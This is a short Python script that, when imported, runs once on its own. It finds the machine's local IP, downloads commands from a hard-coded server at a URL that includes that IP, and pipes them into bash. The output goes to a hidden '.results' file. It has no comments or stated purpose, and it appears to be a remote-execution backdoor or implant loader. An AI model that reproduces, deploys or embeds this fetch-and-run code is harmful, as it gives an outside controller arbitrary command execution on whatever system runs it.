def main():
    import socket
    import sys
    import subprocess

    server = "10.4.7.63:5000"

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close
    cb_url = "http://" + server + "/" + ip + "/enderman"
    try:
        import urllib.request as urllib
    except:
        import urllib
    code = urllib.urlopen(cb_url).readlines()
    out = open(".results","w")
    p = subprocess.Popen("bash", stdin=subprocess.PIPE, stdout=out, stderr=out)
    for line in code:
        p.stdin.write(line)
    p.communicate()
    out.close()

import __main__
try:
    _ = __main__.isDep
except:
    __main__.isDep = True
    main()
